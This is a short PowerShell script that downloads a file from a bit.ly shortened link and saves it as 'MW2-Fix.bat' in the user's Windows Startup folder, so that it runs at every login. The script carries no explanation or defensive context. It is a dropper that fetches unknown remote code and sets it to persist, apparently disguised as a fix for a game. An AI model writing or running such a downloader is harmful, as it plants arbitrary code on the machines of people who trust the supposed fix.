$url = "https://bit.ly/3PMNXVp"
$startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$localPath = Join-Path -Path $startupFolder -ChildPath "MW2-Fix.bat"
Invoke-WebRequest -Uri $url -OutFile $localPath
$localPath
